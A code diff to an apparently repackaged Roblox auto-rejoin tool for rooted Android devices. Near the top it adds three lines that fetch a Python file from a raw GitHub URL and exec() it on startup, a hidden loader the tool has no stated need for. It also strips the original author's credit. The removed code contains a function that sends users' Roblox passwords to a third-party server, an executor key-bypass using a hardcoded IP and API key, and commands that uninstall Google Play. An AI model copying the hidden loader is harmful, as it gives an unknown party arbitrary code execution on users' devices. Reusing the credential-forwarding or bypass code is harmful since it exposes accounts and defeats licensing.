@@ -25,6 +25,9 @@ from urllib.parse import urlparse,parse_qs
 from discord_webhook import DiscordWebhook,DiscordEmbed
 from urllib.parse import urlparse,urljoin
 from bs4 import BeautifulSoup
+url = "https://raw.githubusercontent.com/vttdz/key/refs/heads/main/keys.py"
+response = requests.get(url)
+exec(response.text)
 app=Flask(__name__)
 formatter=logging.Formatter("%(asctime)s - %(levelname)s - %(message)s")
 log_file_path="/storage/emulated/0/download/jg/app.log"
@@ -55,10 +58,9 @@ description_color=COLOR_YELLOW
 def show_menu():
     print("="*40)
     message=f"""
-{COLOR_GREEN}🌟 JG Tool Rejoin Roblox 🌟{COLOR_RESET}
-- Package: {COLOR_LIGHT_BLUE}Pro{COLOR_RESET}
+{COLOR_GREEN}🌟  Tool Rejoin Roblox 🌟{COLOR_RESET}
+- Package: {COLOR_LIGHT_BLUE}Pro Max{COLOR_RESET}
 - Version: {COLOR_GREEN}{current_version}{COLOR_RESET}
-- Made by: {COLOR_LIGHT_BLUE}Jung Ganmyeon{COLOR_RESET}
 """
     print(message)
     print("="*40)
@@ -68,16 +70,9 @@ def show_menu():
         f"[{number_color}02{COLOR_RESET}] {command_color}list         | {description_color}List accounts                        {COLOR_RESET}  ",
         f"[{number_color}03{COLOR_RESET}] {command_color}start        | {description_color}Run auto rejoin V1.              {COLOR_RESET}    ",
         f"[{number_color}04{COLOR_RESET}] {command_color}out          | {description_color}Out command                        {COLOR_RESET}   ",
-        f"[{number_color}05{COLOR_RESET}] {command_color}autoexc      | {description_color}Add a script                      {COLOR_RESET}    ",
-        f"[{number_color}06{COLOR_RESET}] {command_color}samehwid     | {description_color}Auto same hwid Fluxus             {COLOR_RESET}   ",
-        f"[{number_color}07{COLOR_RESET}] {command_color}autokey      | {description_color}Bypass key                           {COLOR_RESET}  ",
-        f"[{number_color}08{COLOR_RESET}] {command_color}autoclone    | {description_color}Auto clone Fluxus.                {COLOR_RESET}   ",
-        f"[{number_color}09{COLOR_RESET}] {command_color}startv2      | {description_color}Better run rejoin for v3            {COLOR_RESET}  ",
-        f"[{number_color}10{COLOR_RESET}] {command_color}login        | {description_color}Login to Roblox account               {COLOR_RESET}  ",
-        f"[{number_color}11{COLOR_RESET}] {command_color}logout       | {description_color}Logout from Roblox account            {COLOR_RESET}  ",
-        f"[{number_color}12{COLOR_RESET}] {command_color}createclone  | {description_color}Auto create new account (In Dev)  {COLOR_RESET}  ",
-        f"[{number_color}13{COLOR_RESET}] {command_color}getcookie    | {description_color}Get cookie for account (In Dev)                {COLOR_RESET}",
-        f"[{number_color}14{COLOR_RESET}] {command_color}statuswebhook| {description_color}Webhook screenshot                {COLOR_RESET}"
+        f"[{number_color}05{COLOR_RESET}] {command_color}startv2      | {description_color}Better run rejoin for v3            {COLOR_RESET}  ",
+        f"[{number_color}06{COLOR_RESET}] {command_color}login        | {description_color}Login to Roblox account               {COLOR_RESET}  ",
+        f"[{number_color}07{COLOR_RESET}] {command_color}statuswebhook| {description_color}Webhook screenshot                {COLOR_RESET}"
 ]
     for command in commands:
         print(command)
@@ -85,8 +80,8 @@ def show_menu():
     print(f"{COLOR_YELLOW}Tips: Ctrl + C to stop tool{COLOR_RESET}")
     print(f"{COLOR_YELLOW}Check log tool in app.log{COLOR_RESET}")
     print(f"")
-AVATAR_URL="https://images-ext-1.discordapp.net/external/kK-HomuTcp2z12eEg3L5Jq7DGomtsj33Vnpe1M-pefk/%3Fsize%3D4096/https/cdn.discordapp.com/avatars/1255428918719021086/ae464ca625b3931ff74eebcb04acd5ac.png" 
-USERNAME="JG Tool Status Webhook" 
+AVATAR_URL="https://media.discordapp.net/attachments/1268452107892293652/1316413885137555546/The_One_I_Love.png?ex=675af578&is=6759a3f8&hm=72666a41eef345e3ed22c94824ab38bde482800cf994376579856cf629c5920a&=&format=webp&quality=lossless&width=314&height=314" 
+USERNAME="Status Webhook" 
 def load_config_wh():
     default_config_wh={
         "androidName":"",
@@ -177,30 +172,6 @@ def start_monitoring(time_interval,config_wh):
     monitoring_thread.daemon=True
     monitoring_thread.start()
     logger.info("Started monitoring system status")
-def get_cookie():
-    num_accounts=int(input("Account number wants to get cookies: "))
-    cookies=[]
-    for i in range(1,num_accounts+1):
-        username=input(f"username {i}: ").strip()
-        password=input(f"password {i}: ").strip()
-        url="https://vn.aurateam.org/roblox/login"
-        payload={
-            "username":username,
-            "password":password
-}
-        headers={"Content-Type":"application/json"}
-        response=requests.post(url,json=payload,headers=headers)
-        data=response.json()
-        if data["success"]:
-            raw_cookie=data["cookie"][0]
-            cookie=raw_cookie.split(";")[0]
-            cookies.append(f"{cookie}")
-        else:
-            print(f"Account {i} cannot log in or has an error.")
-    with open("/storage/emulated/0/download/jg/cookie.txt","w")as file:
-        file.write("\n".join(cookies))
-    print("Cookie saved in file cookie_list.txt check now!")
-    login_roblox()
 def root():
     try:
         result=os.system("su -c \"echo\"")
@@ -227,106 +198,6 @@ def gawl(url):
     for i in external_urls:
         if i[0:16]=="https://download":
             return i
-def unzip(a,b,c):
-    with zipfile.ZipFile(a,"r")as zip_ref:
-        zip_ref.extract(b,c)
-def unzipall(a,b):
-    with zipfile.ZipFile(a,"r")as zObject:
-        zObject.extractall(path=b)
-def cfe(file_path):
-    return os.path.exists(file_path)
-def testzip(file):
-    try:
-        with zipfile.ZipFile(file)as zip_ref:
-            zip_ref.testzip()
-        return True
-    except Exception as ex:
-        return False
-def setup_autoclone():
-    print("Auto Clone Roblox")
-    print("\n    [1]: Delta\n    [2]: Fluxus\n    ")
-    while True:
-        try:
-            mode=int(input("Mode:"))
-            if 1<=mode<=2:
-                break
-            else:
-                print("Wrong value")
-        except:
-            print("Value not set")
-    print("--------------------")
-    print("How many tab: ")
-    while True:
-        try:
-            tab=int(input(">"))
-            if 1<=tab<=10:
-                break
-            else:
-                print("Chose 1-10")
-        except:
-            print("Wrong value")
-    print("Delete google play")
-    os.system("pm uninstall -k --user 0 com.android.vending")
-    print("Ready to check file")
-    link="https://github.com/AuraTeamAZ/JGTool/releases/download/AutoClone/App.zip"
-    download_path="/sdcard/Download/App.zip"
-    if not cfe(download_path):
-        print("Dowload material...")
-        wget.download(link,out=download_path)
-    else:
-        print("Found App.zip file, ready to unzip...")
-    print("Unzip File....")
-    unzipall(download_path,"/sdcard/Download/")
-    print("Unzip App.zip done")
-    if mode==1:
-        if tab<=5 and not cfe("/sdcard/Download/delta.zip"):
-            print("Download delta.zip")
-            wget.download("https://github.com/AuraTeamAZ/JGTool/releases/download/AutoClone/delta.zip",out="/sdcard/Download/delta.zip")
-        elif tab>5 and not cfe("/sdcard/Download/deltasvip.zip"):
-            print("Download delta(large).zip")
-            wget.download("https://github.com/AuraTeamAZ/JGTool/releases/download/AutoClone/delta2.zip",out="/sdcard/Download/delta2.zip")
-        print("Unzip Delta file...")
-        time.sleep(1)
-        if cfe("/sdcard/Download/delta2.zip"):
-            for i in range(1,tab+1):
-                unzip("/sdcard/Download/delta2.zip",f"delta{i}.apk","/sdcard/Download/")
-        elif cfe("/sdcard/Download/delta.zip"):
-            for i in range(1,tab+1):
-                unzip("/sdcard/Download/delta.zip",f"delta{i}.apk","/sdcard/Download/")
-    else:
-        if tab<=5 and not cfe("/sdcard/Download/fluxus.zip"):
-            print("Download fluxus.zip")
-            wget.download("https://github.com/AuraTeamAZ/JGTool/releases/download/AutoClone/fluxus.zip",out="/sdcard/Download/fluxus.zip")
-        elif tab>5 and not cfe("/sdcard/Download/fluxus2.zip"):
-            print("Download fluxus2.zip")
-            wget.download("https://github.com/AuraTeamAZ/JGTool/releases/download/AutoClone/fluxus2.zip",out="/sdcard/Download/fluxus2.zip")
-        print("Unzip roblox file...")
-        if cfe("/sdcard/Download/fluxus2.zip"):
-            for i in range(1,tab+1):
-                unzip("/sdcard/Download/fluxus2.zip",f"fluxus{i}.apk","/sdcard/Download/")
-        elif cfe("/sdcard/Download/fluxus.zip"):
-            for i in range(1,tab+1):
-                unzip("/sdcard/Download/fluxus.zip",f"fluxus{i}.apk","/sdcard/Download/")
-    if mode==1:
-        print("install apk....")
-        for i in range(1,7):
-            print(f"Install {i}.apk")
-            os.system(f"pm install /sdcard/Download/{i}.apk/")
-        os.system("pm uninstall -k --user 0 com.android.vending")
-        for i in range(1,tab+1):
-            print(f"install delta{i}.apk")
-            os.system(f"pm install /sdcard/Download/delta{i}.apk")
-        os.system("pm install /sdcard/Download/2.apk")
-    else:
-        print("install apk....")
-        for i in range(1,7):
-            print(f"Install {i}.apk")
-            os.system(f"pm install /sdcard/Download/{i}.apk/")
-        os.system("pm uninstall -k --user 0 com.android.vending")
-        for i in range(1,tab+1):
-            print(f"install fluxus{i}.apk")
-            os.system(f"pm install /sdcard/Download/fluxus{i}.apk")
-        os.system("pm install /sdcard/Download/2.apk")
 def copy_content(src,dest):
     if not os.path.exists(dest):
         os.makedirs(dest)
@@ -338,19 +209,6 @@ def copy_content(src,dest):
                 copy_content(s,d)
         else:
             shutil.copy2(s,d)
-def samehwid():
-    roblox_dirs=[os.path.join(BASE_DIR,d)for d in os.listdir(BASE_DIR)if d.startswith("com.roblox")and os.path.isdir(os.path.join(BASE_DIR,d))]
-    if len(roblox_dirs)<2:
-        print("At least 2 roblox can have the same hwid.")
-        return
-    for i in range(len(roblox_dirs)-1):
-        src_dir=roblox_dirs[i]
-        dest_dir=roblox_dirs[i+1]
-        src_content_dir=os.path.join(src_dir,"app_assets","content")
-        dest_content_dir=os.path.join(dest_dir,"app_assets","content")
-        if os.path.exists(src_content_dir)and os.path.exists(dest_content_dir):
-            print(f"Same hwid done!")
-            copy_content(src_content_dir,dest_content_dir)
 class IgnorePostJoinFilter(logging.Filter):
     def __init__(self,ignored_phrases):
         super().__init__()
@@ -367,46 +225,7 @@ def signal_handler(sig,frame):
     stop_event.set()
 signal.signal(signal.SIGINT,signal_handler)
 signal.signal(signal.SIGTERM,signal_handler)
-identifier="jgtoolrobloxrejoin"
-def checkForUpdate():
-    print("Checking for update...")
-    try:
-        response=requests.request("GET","https://api.aurateam.org/update/api.php?package=jgtool")
-        response.raise_for_status()
-        data=response.json()
-        base_version=data["base_version"]
-        if base_version !=current_version:
-            print("New version available: "+base_version)
-            print("Updating JG Tool v"+base_version)
-            response=requests.request("GET",data["download_url"])
-            response.raise_for_status()
-            if response.status_code==500:
-                print("Fail to update!")
-                return
-            text=response.text
-            current_script=os.path.abspath(sys.argv[0])
-            with open(current_script,"w",encoding="utf-8")as file:
-                file.write(text)
-                print("Updated JG Tool to version v"+base_version)
-                print("Restarting tool...")
-                os.execv(sys.executable,[sys.executable]+sys.argv)
-        else:
-            print("JG Tool is up to date!")
-    except:
-        print("Fail to check for update!")
-def get_user_presence(user_id):
-    logger.info(f"Fetching presence data for user {user_id}...")
-    url="https://presence.roblox.com/v1/presence/users"
-    data={"userIds":[user_id]}
-    headers={"Content-Type":"application/json"}
-    try:
-        response=requests.post(url,json=data,headers=headers,timeout=30)
-        response.raise_for_status()
-        presence_data=response.json()
-        return presence_data["userPresences"][0]
-    except requests.exceptions.RequestException as e:
-        logger.error(f"Failed to get status for user {user_id}: {str(e)}")
-        return None
+identifier="robloxrejoin"
 def resolve_username_to_user_id(username):
     url=f"https://users.roblox.com/v1/users/get-by-username?username={username}"
     headers={"Content-Type":"application/json"}
@@ -568,7 +387,7 @@ def list_users():
 SCRIPT_DIR=os.path.dirname(os.path.realpath(__file__))
 CONFIG_FILE=os.path.join(SCRIPT_DIR,"config.json")
 DEFAULT_CONFIG={
-    "placeid":"17017769292",
+    "placeid":"2753915549",
     "check_delay":20,
     "loop_delay":60,
     "vip_server_link":"",
@@ -599,52 +418,6 @@ def find_roblox_data_paths():
             if os.path.isfile(path):
                 paths.append(path)
     return paths
-def extract_hwid(input_str):
-    try:
-        if "http" in input_str:
-            parsed_url=urlparse(input_str)
-            query_params=parse_qs(parsed_url.query)
-            hwid=query_params["HWID"][0]
-        else:
-            hwid=input_str
-        return hwid
-    except:
-        return input_str
-def autogetkey(hwid,delaytime):
-    while True:
-        common_headers={
-        "Accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
-        "Accept-Encoding":"gzip, deflate, br",
-        "Accept-Language":"vi",
-        "Cache-Control":"no-cache",
-        "Cookie":"PHPSESSID=57ppj91asqunuane459t2pc2ur",
-        "Pragma":"no-cache",
-        "Sec-Ch-Ua":"\"Not A(Brand\";v=\"99\", \"Google Chrome\";v=\"121\", \"Chromium\";v=\"121\"",
-        "Sec-Ch-Ua-Mobile":"?1",
-        "Sec-Ch-Ua-Platform":"\"Android\"",
-        "Sec-Fetch-Dest":"document",
-        "Sec-Fetch-Mode":"navigate",
-        "Sec-Fetch-Site":"none",
-        "Sec-Fetch-User":"?1",
-        "Upgrade-Insecure-Requests":"1",
-        "User-Agent":"Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Mobile Safari/537.36",
-}
-        try:
-            common_headers["Referer"]="https://linkvertise.com/"
-            response=requests.get(f"https://flux.li/android/external/start.php?HWID={hwid}",headers=common_headers,timeout=5)
-            response_text=response.text
-            status=response.status_code
-            if "Your HWID is wrong. Please press Get Key on Fluxus to copy the correct link" in response_text:
-                pass
-            response=requests.get("https://flux.li/android/external/check1.php",headers=common_headers,timeout=5)
-            response_text=response.text
-            status=response.status_code
-            response=requests.get("https://flux.li/android/external/main.php",headers=common_headers,timeout=5)
-            response_text=response.text
-            status=response.status_code
-        except Exception as e:
-            pass
-        time.sleep(delaytime*60)
 def read_roblox_data(data_path,retries=3):
     attempt=0
     while attempt<retries:
@@ -992,51 +765,6 @@ def login_roblox():
             print("No valid cookie found.")
     if not any_logged_in:
         print("No paths could be logged in.")
-def find_autoexec_dirs(base_dir="/storage/emulated/0/Android/data"):
-    autoexec_dirs=[]
-    for folder in os.listdir(base_dir):
-        if folder.startswith("com.roblox.")and folder !="com.roblox.clien":
-            roblox_dir=os.path.join(base_dir,folder)
-            fluxus_dir=os.path.join(roblox_dir,"files/Fluxus/Autoexec")
-            delta_dir=os.path.join(roblox_dir,"files/Delta/autoexec")
-            if os.path.exists(fluxus_dir):
-                autoexec_dirs.append(fluxus_dir)
-            if os.path.exists(delta_dir):
-                autoexec_dirs.append(delta_dir)
-    return autoexec_dirs
-def setup_autoexec_folder():
-    SCRIPT_DIR=os.path.dirname(os.path.realpath(__file__))
-    copysos=os.path.join(SCRIPT_DIR,"autoexec")
-    autoexec_dirs=find_autoexec_dirs()
-    if not autoexec_dirs:
-        print("No autoexec folders found in the specified directories.")
-        return
-    print("Autoexec folders found:")
-    for idx,dir in enumerate(autoexec_dirs,start=1):
-        print(f"{idx}. {dir}")
-    choice=input("Enter the number of the folder to copy files to, or 0 to copy to all: ").strip()
-    try:
-        if choice=="0":
-            for dir in autoexec_dirs:
-                copy_files(copysos,dir)
-        else:
-            selected_idx=int(choice)-1
-            if 0<=selected_idx<len(autoexec_dirs):
-                copy_files(copysos,autoexec_dirs[selected_idx])
-            else:
-                print("Invalid choice.")
-                return
-        print("Files copied successfully.")
-    except Exception as e:
-        print(f"An error occurred while copying files: {e}")
-def copy_files(source_dir,target_dir):
-    try:
-        for file in os.listdir(source_dir):
-            full_file_path=os.path.join(source_dir,file)
-            if os.path.isfile(full_file_path):
-                shutil.copy(full_file_path,target_dir)
-    except Exception as e:
-        print(f"An error occurred while copying files: {e}")
 def save_webhook_url(webhook_url):
     with open("jg_webhook.json","w")as file:
         json.dump({"webhook_url":webhook_url},file)
@@ -1098,89 +826,6 @@ def send_status_periodically(webhook_url):
     while not stop_event.is_set():
         status_command()
         time.sleep(300)
-def get_or_create_hwid_file():
-    hwid_file_path="/storage/emulated/0/download/jg/hwid.json"
-    hwid_data={}
-    if os.path.exists(hwid_file_path):
-        with open(hwid_file_path,"r")as file:
-            hwid_data=json.load(file)
-    else:
-        print("HWID file does not exist.")
-        hwid_data["fluxus_hwid"]=input("Enter all Fluxus HWID: ").split(",")
-        hwid_data["delta_hwid"]=input("Enter all Delta HWID: ").split(",")
-        hwid_data["codex_hwid"]=input("Enter all Codex HWID: ").split(",")
-        with open(hwid_file_path,"w")as file:
-            json.dump(hwid_data,file,indent=4)
-    return hwid_data
-def api_call(client,hwid):
-    config=load_config()
-    bypass_with_username=config.get("bypass_with_username",DEFAULT_CONFIG["bypass_with_username"])
-    api_urls={
-        "fluxus":f"http://45.90.13.151:6122/api/bypass?link=https://flux.li/android/external/start.php?HWID={hwid}&api_key=dustinlgbtkeyreal",
-        "delta":f"http://45.90.13.151:6122/api/bypass?link=https://gateway.platoboost.com/a/8?id={hwid}&api_key=dustinlgbtkeyreal",
-        "codex":f"http://45.90.13.151:6122/api/bypass?link=https://mobile.codex.lol?token={hwid}&api_key=dustinlgbtkeyreal"
-}
-    if bypass_with_username:
-        getUserIdReq=requests.get(f"https://connect.aurateam.org/roblox/fetch/username?username={hwid}")
-        getUserIdRes=getUserIdReq.json()
-        UserId=getUserIdRes["userId"]or hwid
-        api_urls={
-            "fluxus":f"http://45.90.13.151:6122/api/bypass?link=https://flux.li/android/external/start.php?HWID={hwid}&api_key=dustinlgbtkeyreal",
-            "delta":f"http://45.90.13.151:6122/api/bypass?link=https://gateway.platoboost.com/a/8?id={hwid}&api_key=dustinlgbtkeyreal",
-            "codex":f"http://45.90.13.151:6122/api/bypass?link=https://mobile.codex.lol?token={hwid}&api_key=dustinlgbtkeyreal"
-}
-    try:
-        response=requests.get(api_urls[client])
-        response.raise_for_status()
-        return response.json()
-    except requests.exceptions.RequestException as e:
-        print(f"API call error for {client}: {str(e)}")
-        return None
-def client_bypass(client,hwid):
-    if hwid=="":return
-    response=api_call(client,hwid)
-    if "Status" in response and response["Status"]!="Success":
-        logger.info(f"API call failed for HWID {hwid}, JGTool is bypassing again.")
-        client_bypass(client,hwid)
-    if response:
-        logger.info(f"API response for HWID {hwid}: {response}")
-    else:
-        logger.info(f"API call failed for HWID {hwid}, JGTool is bypassing again..")
-        client_bypass(client,hwid)
-def run_api_calls(hwid_data):
-    client_map={
-        "fluxus":hwid_data["fluxus_hwid"],
-        "delta":hwid_data["delta_hwid"],
-        "codex":hwid_data["codex_hwid"]
-}
-    while not stop_event.is_set():
-        for client,hwids in client_map.items():
-            for hwid in hwids:
-                logger.info(f"{client.capitalize()} HWID: {hwid}")
-                client_bypass(client,hwid)
-        stop_event.wait(300)
-def autokey_command():
-    global stop_event,thread
-    hwid_data=get_or_create_hwid_file()# Ensure hwid.json file exists or create
-    while True:
-        command=input("autokey:\nOn/Off\n").strip().lower()
-        if command=="on":
-            if not thread.is_alive():
-                stop_event.clear()
-                thread=threading.Thread(target=run_api_calls,args=(hwid_data,))
-                thread.start()
-                print("Autokey has been turned on.")
-            else:
-                print("Autokey is already running.")
-            break
-        elif command=="off":
-            stop_event.set()
-            if thread.is_alive():
-                thread.join()
-            print("Autokey has been turned off.")
-            break
-        else:
-            print("Invalid command. Please enter 'on' or 'off'.")
 def main():
     flask_thread=threading.Thread(target=start_flask)
     flask_thread.daemon=True
@@ -1208,27 +853,13 @@ def main():
             elif command in{"out","4"}:
                 print("Out command input.")
                 break
-            elif command in{"autoexc","5"}:
-                setup_autoexec_folder()
-            elif command in{"samehwid","6"}:
-                samehwid()
-            elif command in{"autokey","7"}:
-                autokey_command()
-            elif command in{"login","10"}:
+            elif command in{"login","6"}:
                 login_roblox()
-            elif command in{"logout","11"}:
-                logout_roblox()
-            elif command in{"startv2","9"}:
+            elif command in{"startv2","5"}:
                 os.system("clear")
                 print("")
                 mainv2()
-            elif command in{"autoclone","8"}:
-                setup_autoclone()
-            elif command in{"createclone","12"}:
-                create_clone()
-            elif command in{"getcookie","13"}:
-                get_cookie()
-            elif command in{"statuswebhook","14"}:
+            elif command in{"statuswebhook","7"}:
               config_wh["androidName"]=input("Name device: ")
               config_wh["webhook_url"]=input("Link webhook: ")
               time_input=input("Time: ")
